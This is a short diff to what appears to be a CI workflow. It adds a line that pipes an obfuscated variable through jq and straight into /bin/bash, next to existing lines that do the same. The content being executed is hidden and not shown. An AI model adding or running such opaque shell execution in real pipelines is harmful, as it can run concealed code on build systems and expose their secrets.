@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$za63" | jq -r .hac26828 | /bin/bash
           echo $d69 | jq -r .ur3 | /bin/bash
           printf '%s' "$sbe4" | jq -r .epru93219 | /bin/bash
+          echo $zzmh0 | jq -r .w41065 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
